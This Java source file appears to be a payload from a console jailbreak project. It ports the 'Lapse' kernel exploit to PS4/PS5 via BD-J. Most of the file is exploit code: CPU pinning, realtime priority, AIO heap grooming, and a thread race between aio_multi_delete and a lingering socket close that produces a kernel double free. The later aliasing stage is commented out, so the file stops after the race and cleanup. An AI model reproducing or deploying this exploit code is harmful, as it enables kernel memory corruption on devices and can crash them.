package org.bdj.payload;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import org.bdj.UITextConsole;
import org.bdj.api.API;
import org.bdj.api.Buffer;
import org.bdj.payload.LibKernel.AioRWRequest;
import org.bdj.payload.LibKernel.AioRWRequests;
import org.bdj.payload.LibKernel.AioSubmitIds;
import org.bdj.payload.LibKernel.KernelModuleInfo;

public class Payload {
	public static void main(UITextConsole console) throws Exception {
		final LibKernel lk = new LibKernel(console);
		final API api = LibKernel.api;

		// Credit to flatz for this technique
		KernelModuleInfo kmi = lk.sceKernelGetModuleInfoFromAddr();
		if (kmi.initProcAddr - kmi.firstSegment == 0) {
			console.add("platform is PS4");
		} else if (kmi.initProcAddr - kmi.firstSegment == 0x10) {
			console.add("platform is PS5");
		} else {
			console.add("platform is unknown");
		}

		long pid = lk.syscall(LibKernel.SYS_getpid);
		if (pid == 0 || (pid & 0xFFFFFFFF00000000L) != 0) {
			throw new Exception("sanity check failed: getpid returned " + pid);
		}

		/*******************************************************************************************
		 * Lapse constants
		 ******************************************************************************************/

		int MAIN_CORE = 4;
		int MAIN_RTPRIO = 0x100;
		int NUM_WORKERS = 2;
		int NUM_GROOMS = 0x200;
		int NUM_GROOM_REQS = 3;
		int NUM_HANDLES = 0x100;
		int NUM_RACES = 100;
		int NUM_RACE_REQS = 3;
		int NUM_SDS = 64;
		int NUM_SDS_ALT = 48;
		int NUM_ALIAS = 100;
		int LEAK_LEN = 16;
		int NUM_LEAKS = 16;
		int NUM_CLOBBERS = 8;

		/*******************************************************************************************
		 * Lapse pre-setup: Pin to 1 core so that we only use 1 per-cpu bucket. This will make heap
		 * spraying and grooming easier. Also set priority to realtime.
		 * http://fxr.watson.org/fxr/source/sys/cpuset.h?v=FREEBSD-9-1
		 * https://man.freebsd.org/cgi/man.cgi?query=cpuset&sektion=2&apropos=0&manpath=FreeBSD+9.1-RELEASE
		 ******************************************************************************************/

		console.add("Lapse pre-setup: pin to core " + MAIN_CORE + " and set priority " + MAIN_RTPRIO);

		final int CPU_LEVEL_ROOT   = 1; // all system CPUs
		final int CPU_LEVEL_CPUSET = 2; // available cpus for which
		final int CPU_LEVEL_WHICH  = 3; // actual mask/id for which

		final int CPU_WHICH_TID    = 1; // id is a thread id  (-1 means current)
		final int CPU_WHICH_PID    = 2; // id is a process id (-1 means current)
		final int CPU_WHICH_CPUSET = 3; // id is a cpuset id  (-1 means current)
		final int CPU_WHICH_IRQ    = 4; // id is an IRQ number

		final int CPU_SETSIZE = 16; // this is what Lapse does, I will assume it's correct

		Buffer oldAffinity = new Buffer(CPU_SETSIZE);
		long r = lk.syscall(LibKernel.SYS_cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, -1,
			oldAffinity.size(), oldAffinity.address());
		if (r != 0) {
			console.add("failed to get affinity: cpuset_getaffinity returned " + r);
		}
		console.add("cpuset_getaffinity(WHICH, TID, -1) is 0x" +
			Long.toHexString(api.read64(oldAffinity.address())) +
			Long.toHexString(api.read64(oldAffinity.address() + 8)));

		final Buffer newAffinity = new Buffer(CPU_SETSIZE);
		newAffinity.fill((byte)0);
		api.write16(newAffinity.address(), (short)(1 << MAIN_CORE));
		r = lk.syscall(LibKernel.SYS_cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, -1,
			newAffinity.size(), newAffinity.address());
		if (r != 0) {
			console.add("failed to set affinity: cpuset_setaffinity returned " + r);
		} else {
			console.add("cpuset_setaffinity(WHICH, TID, -1) to 0x" +
				Long.toHexString(api.read64(newAffinity.address())) +
				Long.toHexString(api.read64(newAffinity.address() + 8)));
		}

		final int RTP_LOOKUP = 0;
		final int RTP_SET = 1;
		final int PRI_REALTIME = 2;

		Buffer oldRtPrio = new Buffer(4);
		api.write16(oldRtPrio.address(), (short)PRI_REALTIME);
		r = lk.syscall(LibKernel.SYS_rtprio_thread, RTP_LOOKUP, 0, oldRtPrio.address());
		console.add("rtprio_thread(RTP_LOOKUP, 0) is " + api.read16(oldRtPrio.address() + 2));

		final Buffer newRtPrio = new Buffer(4);
		api.write16(newRtPrio.address() + 0, (short)PRI_REALTIME);
		api.write16(newRtPrio.address() + 2, (short)MAIN_RTPRIO);
		r = lk.syscall(LibKernel.SYS_rtprio_thread, RTP_SET, 0, newRtPrio.address());
		if (r != 0) {
			console.add("failed to set priority to realtime: rtprio_thread returned " + r);
		} else {
			console.add("rtprio_thread(RTP_SET, 0) to " + api.read16(newRtPrio.address() + 2));
		}

		/*******************************************************************************************
		 * Lapse pre-setup: create socket pair
		 * http://fxr.watson.org/fxr/source/sys/socket.h?v=FREEBSD-9-1
		 ******************************************************************************************/

		console.add("Lapse pre-setup: create socket pair");

		final byte AF_UNIX  = 1;  // local to host (pipes, portals)
		final byte AF_INET  = 2;  // internetwork: UDP, TCP, etc.
		final byte AF_INET6 = 28; // IPv6

		final byte SOCK_STREAM = 1; // stream socket
		final byte SOCK_DGRAM  = 2; // datagram socket
		final byte SOCK_RAW    = 3; // raw-protocol socket

		final int SOL_SOCKET      = 0xffff; // options for socket level
		final int SO_DEBUG        = 0x0001; // turn on debugging info recording
		final int SO_ACCEPTCONN   = 0x0002; // socket has had listen()
		final int SO_REUSEADDR    = 0x0004; // allow local address reuse
		final int SO_KEEPALIVE    = 0x0008; // keep connections alive
		final int SO_DONTROUTE    = 0x0010; // just use interface addresses
		final int SO_BROADCAST    = 0x0020; // permit sending of broadcast msgs
		final int SO_USELOOPBACK  = 0x0040; // bypass hardware when possible
		final int SO_LINGER       = 0x0080; // linger on close if data present
		final int SO_OOBINLINE    = 0x0100; // leave received OOB data in line
		final int SO_REUSEPORT    = 0x0200; // allow local address & port reuse
		final int SO_TIMESTAMP    = 0x0400; // timestamp received dgram traffic
		final int SO_NOSIGPIPE    = 0x0800; // no SIGPIPE from EPIPE
		final int SO_ACCEPTFILTER = 0x1000; // there is an accept filter
		final int SO_BINTIME      = 0x2000; // timestamp received dgram traffic
		final int SO_NO_OFFLOAD   = 0x4000; // socket cannot be offloaded
		final int SO_NO_DDP       = 0x8000; // disable direct data placement

		Buffer socketPairBuf = new Buffer(2 * 4);
		r = lk.syscall(LibKernel.SYS_socketpair, AF_UNIX, SOCK_STREAM, 0, socketPairBuf.address());
		if (r != 0) {
			console.add("failed to get socket pair: socketpair returned " + r);
		}
		int blockFd   = api.read32(socketPairBuf.address() + 0);
		int unblockFd = api.read32(socketPairBuf.address() + 4);
		console.add("generated block/unblock socket pair: " + blockFd + "/" + unblockFd);

		/*******************************************************************************************
		 * Lapse setup part 1: block AIO
		 * This part will block the worker threads from processing entries so that we may cancel
		 * them instead. This is to work around the fact that aio_worker_entry2() will fdrop() the
		 * file associated with the aio_entry on ps5. We want aio_multi_delete() to call fdrop().
		 * NOTE: It sounds like we don't need to implement this, if it's only relevant on PS5?
		 *       Still, it's not that much code.
		 ******************************************************************************************/

		console.add("Lapse setup part 1: block AIO");

		AioRWRequests blockReqs = new AioRWRequests(NUM_WORKERS);
		for (int i = 0; i < blockReqs.count; i++) {
			blockReqs.set(i, 0, 1, null, null, blockFd);
		}
		AioSubmitIds blockId = new AioSubmitIds(1);
		r = lk.aioSubmitCmd(LibKernel.AIO_CMD_READ, blockReqs, blockId);
		if (r != 0) {
			console.add("error: aio_submit_cmd returned " + r);
		}

		/*******************************************************************************************
		 * Lapse setup part 2: heap grooming
		 ******************************************************************************************/

		console.add("Lapse setup part 2: heap grooming");

		// 3 chosen to maximize the number of 0x80 malloc allocs per submission
		AioRWRequests groomRequests = new AioRWRequests(NUM_GROOM_REQS);
		AioSubmitIds groomIds = new AioSubmitIds(NUM_GROOMS);

		// Lapse calls this spray_aio
		// Allocate enough so that we start allocating from a newly created slab
		for (int i = 0; i < NUM_GROOMS; i++) {
			AioSubmitIds id = new AioSubmitIds(groomIds.address() + i * AioSubmitIds.STRIDE, 1);
			lk.aioSubmitCmd(LibKernel.AIO_CMD_READ, groomRequests, id);
		}
		lk.aioMultiCancel(groomIds);

		/*******************************************************************************************
		 * Lapse double_free_reqs2 part 1: setup socket to wait for soclose
		 ******************************************************************************************/

		console.add("Lapse double_free_reqs2 part 1: setup socket to wait for soclose");

		long sdListen = lk.syscall(LibKernel.SYS_socket, AF_INET, SOCK_STREAM, 0);
		console.add("sdListen is " + sdListen);

		Buffer serverAddr = new Buffer(16); // sockaddr_in
		serverAddr.fill((byte)0);
		api.write8 (serverAddr.address() + 1, AF_INET); // sin_family
		api.write16(serverAddr.address() + 2, htons(5050)); // sin_port
		api.write32(serverAddr.address() + 4, aton(127, 0, 0, 1)); // sin_addr

		Buffer enable = new Buffer(4);
		api.write32(enable.address(), 1);

		r = lk.syscall(LibKernel.SYS_setsockopt, sdListen, SOL_SOCKET, SO_REUSEADDR, enable.address(), enable.size());
		if (r != 0) {
			console.add("error: setsockopt returned " + r);
		}

		r = lk.syscall(LibKernel.SYS_bind, sdListen, serverAddr.address(), serverAddr.size());
		if (r != 0) {
			console.add("error: bind returned " + r);
		}

		r = lk.syscall(LibKernel.SYS_listen, sdListen, 1);
		if (r != 0) {
			console.add("error: listen returned " + r);
		}

		/*******************************************************************************************
		 * Lapse double_free_reqs2 part 2: start race
		 ******************************************************************************************/

		console.add("Lapse double_free_reqs2 part 2: start race");

		AioRWRequests raceRequests = new AioRWRequests(NUM_RACE_REQS);
		AioSubmitIds raceIds = new AioSubmitIds(NUM_RACE_REQS);
		int whichRequest = NUM_RACE_REQS - 1;
		int multiReadCmd = LibKernel.AIO_CMD_READ | LibKernel.AIO_CMD_MULTI;

		final Buffer pipeBuf = new Buffer(8);
		final Buffer readySignal = new Buffer(8); // also abused to store tid
		final Buffer deleteSignal = new Buffer(8);
		final Buffer errors = new Buffer(8);

		for (int race = 0; race < NUM_RACES; race++) {
			long sdClient = lk.syscall(LibKernel.SYS_socket, AF_INET, SOCK_STREAM, 0);

			r = lk.syscall(LibKernel.SYS_connect, sdClient, serverAddr.address(), serverAddr.size());
			if (r != 0) {
				console.add("racer " + race + ": error: connect returned " + r);
				break; // connect failing is one of the failure modes that crashes the whole PS4
			}

			long sdConnection = lk.syscall(LibKernel.SYS_accept, sdListen, 0, 0);
			if (sdConnection == -1) {
				console.add("racer " + race + ": error: accept returned -1");
			}
			console.add("racer " + race + ": client " + sdClient + " connection " + sdConnection);

			// Force soclose() to sleep
			Buffer linger = new Buffer(8);
			api.write32(linger.address() + 0, 1); // l_onoff - linger active
			api.write32(linger.address() + 4, 1); // l_linger - how many seconds to linger for
			lk.syscall(LibKernel.SYS_setsockopt, sdClient, SOL_SOCKET, SO_LINGER, linger.address(), linger.size());

			// Set up the one request that all the racer threads will be trying to delete
			AioRWRequest raceRequest = raceRequests.get(whichRequest);
			raceRequest.set(0, 0, null, null, (int)sdClient);
			r = lk.aioSubmitCmd(multiReadCmd, raceRequests, raceIds);
			if (r != 0) {
				console.add("racer " + race + ": error: aio_submit_cmd returned " + r);
			}
			lk.aioMultiCancel(raceIds);
			lk.aioMultiPoll(raceIds);

			// My fault for making stupid API choices I guess
			final AioRWRequests raceRequestMultiSingle = new AioRWRequests(raceRequest.address(), 1);

			// Drop the reference so that aio_multi_delete will trigger _fdrop
			lk.syscall(LibKernel.SYS_close, sdClient);

			/***************************************************************************************
			 * Lapse race_one
			 **************************************************************************************/

			// Reset race state
			api.write64(readySignal.address(), 0);
			api.write64(deleteSignal.address(), 0);

			api.write32(errors.address() + 0, -1);
			api.write32(errors.address() + 4, -1);

			Buffer pipeFds = new Buffer(8);
			lk.syscall(LibKernel.SYS_pipe, pipeFds.address());
			final int pipeR = api.read32(pipeFds.address());
			final int pipeW = api.read32(pipeFds.address() + 4);

			Thread aioMultiDeleteThread = new Thread(new Runnable() {
				public void run() {
					// Set worker thread affinity (and priority?) to be the same as main thread so
					// they will use similar per-cpu freelist bucket
					lk.syscall(LibKernel.SYS_cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, -1,
						newAffinity.size(), newAffinity.address());
					lk.syscall(LibKernel.SYS_rtprio_thread, RTP_SET, 0, newRtPrio.address());

					// Mark thread as ready
					// No other sensible way to get the tid so we'll do it here
					Buffer tid = new Buffer(8);
					lk.syscall(LibKernel.SYS_thr_self, tid.address());
					api.write64(readySignal.address(), api.read64(tid.address()));

					// Block thread until it's signalled
					lk.syscall(LibKernel.SYS_read, pipeR, pipeBuf.address(), 1);

					// Call the vulnerable aio_multi_delete syscall
					lk.aioMultiDelete(raceRequestMultiSingle, errors);

					// Mark deletion as finished
					// I guess it's expected to fail so no point checking for errors, right?
					api.write64(deleteSignal.address(), 1);
				}
			});

			console.add("racer " + race + ": starting aio_multi_delete thread, pipe " + pipeR + "/" + pipeW);
			aioMultiDeleteThread.start();

			// Wait for thread to be ready
			Buffer timespec1Ns = new Buffer(16);
			api.write64(timespec1Ns.address() + 0, 0); // tv_sec
			api.write64(timespec1Ns.address() + 8, 1); // tv_nsec
			long maxWaits = 10000;
			while (api.read64(readySignal.address()) == 0) {
				lk.syscall(LibKernel.SYS_nanosleep, timespec1Ns.address(), 0);
				if (--maxWaits == 0) {
					console.add("racer " + race + ": worker didn't signal ready; timed out");
					break;
				}
			}
			long tid = api.read64(readySignal.address());
			console.add("racer " + race + ": aio_multi_delete thread has tid " + tid);

			// Notify worker to resume
			lk.syscall(LibKernel.SYS_write, pipeW, pipeBuf.address(), 1);

			// Yield and hope the worker runs next
			lk.syscall(LibKernel.SYS_sched_yield);

			// If we get here and the worker hasn't been reran then we can delay the worker's
			// execution of soclose() indefinitely
			long suspend = lk.syscall(LibKernel.SYS_thr_suspend_ucontext, tid);
			console.add("racer " + race + ": thr_suspend_ucontext for tid " + tid + " returned " + suspend);

			Buffer pollErrors = new Buffer(4);
			// Does Lapse seriously call aio_multi_poll on the *request* and not the *id*?
			// That can't be right. I mean, sure, if it works it works, but why does it work??
			AioSubmitIds raceRequestAsSubmitId = new AioSubmitIds(raceRequest.address(), 1);
			lk.aioMultiPoll(raceRequestAsSubmitId, pollErrors);
			int pollResult = api.read32(pollErrors.address());

			final int IPPROTO_IP   = 0;  // dummy for IP
			final int IPPROTO_ICMP = 1;  // control message protocol
			final int IPPROTO_TCP  = 6;  // tcp
			final int IPPROTO_UDP  = 17; // user datagram protocol

			final int TCP_NODELAY    = 0x01;  // don't delay send to coalesce packets
			final int TCP_MAXSEG     = 0x02;  // set maximum segment size
			final int TCP_NOPUSH     = 0x04;  // don't push last block of write
			final int TCP_NOOPT      = 0x08;  // don't use TCP options
			final int TCP_MD5SIG     = 0x10;  // use MD5 digests (RFC2385)
			final int TCP_INFO       = 0x20;  // retrieve tcp_info structure
			final int TCP_CONGESTION = 0x40;  // get/set congestion control algorithm
			final int TCP_KEEPINIT   = 0x80;  // N, time to establish connection
			final int TCP_KEEPIDLE   = 0x100; // L,N,X start keeplives after this period
			final int TCP_KEEPINTVL  = 0x200; // L,N interval between keepalives
			final int TCP_KEEPCNT    = 0x400; // L,N number of keepalives before close

			final int TCPS_CLOSED       = 0;  // closed
			final int TCPS_LISTEN       = 1;  // listening for connection
			final int TCPS_SYN_SENT     = 2;  // active, have sent syn
			final int TCPS_SYN_RECEIVED = 3;  // have sent and received syn
			// states < TCPS_ESTABLISHED are those where connections not established
			final int TCPS_ESTABLISHED  = 4;  // established
			final int TCPS_CLOSE_WAIT   = 5;  // rcvd fin, waiting for close
			// states > TCPS_CLOSE_WAIT are those where user has closed
			final int TCPS_FIN_WAIT_1   = 6;  // have closed, sent fin
			final int TCPS_CLOSING      = 7;  // closed xchd FIN; await FIN ACK
			final int TCPS_LAST_ACK     = 8;  // had fin and close; await FIN ACK
			// states > TCPS_CLOSE_WAIT && < TCPS_FIN_WAIT_2 await ACK of FIN
			final int TCPS_FIN_WAIT_2   = 9;  // have closed, fin is acked
			final int TCPS_TIME_WAIT    = 10; // in 2*msl quiet wait after close

			Buffer info = new Buffer(256);
			Buffer psize = new Buffer(4);
			api.write32(psize.address(), info.size());
			lk.syscall(LibKernel.SYS_getsockopt, sdConnection, IPPROTO_TCP, TCP_INFO, info.address(), psize.address());
			if (api.read32(psize.address()) != info.size()) {
				console.add("racer " + race + ": getsockopt returned " + api.read32(psize.address()) +
					" bytes, expected " + info.size());
			}

			byte tcpState = api.read8(info.address());
			console.add("racer " + race + ": pollResult " + pollResult + " tcpState " + (int)tcpState);

			boolean wonRace = false;
			// To win, must make sure that poll_res == 0x10003/0x10004 and tcp_state == 5
			// That's what the comment says in Lapse but actually that's not what the code does
			// Possibly because of the raceRequestAsSubmitId bit above?
			if (pollResult != 0x80020003 && tcpState != TCPS_ESTABLISHED) {
				// Double free on the 0x80 malloc zone. Important kernel data may alias.
				lk.aioMultiDelete(raceRequestMultiSingle, errors);
				wonRace = true;
				console.add("racer " + race + ": won race");
			} else {
				console.add("racer " + race + ": did not win race");
			}

			// Resume the worker thread
			long resume = lk.syscall(LibKernel.SYS_thr_resume_ucontext, tid);
			console.add("racer " + race + ": thr_resume_ucontext for tid " + tid + " returned " + resume);

			// Wait for deletion signal
			api.write64(timespec1Ns.address() + 0, 0); // tv_sec
			api.write64(timespec1Ns.address() + 8, 1); // tv_nsec
			maxWaits = 10000;
			while (api.read64(deleteSignal.address()) == 0) {
				lk.syscall(LibKernel.SYS_nanosleep, timespec1Ns.address(), 0);
				if (--maxWaits == 0) {
					console.add("racer " + race + ": worker didn't signal deletion; timed out");
					break;
				}
			}

			if (wonRace) {
				int errMainThread = api.read32(errors.address());
				int errWorkerThread = api.read32(errors.address() + 4);

				// If the code has no bugs then this isn't possible but we keep the check for easier debugging
				// NOTE: both must be equal 0 for the double free to works
				if (errMainThread != errWorkerThread) {
					console.add("racer " + race + ": bug: main/worker thread errors: " +
						Integer.toHexString(errMainThread) + "/" + Integer.toHexString(errWorkerThread));
				}

				// RESTORE: double freed memory has been reclaimed with harmless data
				// PANIC: 0x80 malloc zone pointers aliased
				// return make_aliased_rthdrs(sds);

				// I guess if we won it's pointless to keep going?
				break;
			}
		}

		/*******************************************************************************************
		 * Lapse cleanup
		 ******************************************************************************************/

		console.add("Lapse cleanup");

		lk.syscall(LibKernel.SYS_close, sdListen);

		lk.syscall(LibKernel.SYS_cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, -1,
			oldAffinity.size(), oldAffinity.address());

		lk.syscall(LibKernel.SYS_rtprio_thread, RTP_SET, 0, oldRtPrio.address());

		lk.syscall(LibKernel.SYS_close, blockFd);
		lk.syscall(LibKernel.SYS_close, unblockFd);
	}

	// FIXME: Move elsewhere

	public static short htons(int x) {
		return (short)(((x & 0xff) << 8) | ((x & 0xff00) >> 8));
	}
	public static int aton(int a, int b, int c, int d) {
		return ((d & 0xff) << 24) | ((c & 0xff) << 16) | ((b & 0xff) << 8) | (a & 0xff);
	}
}
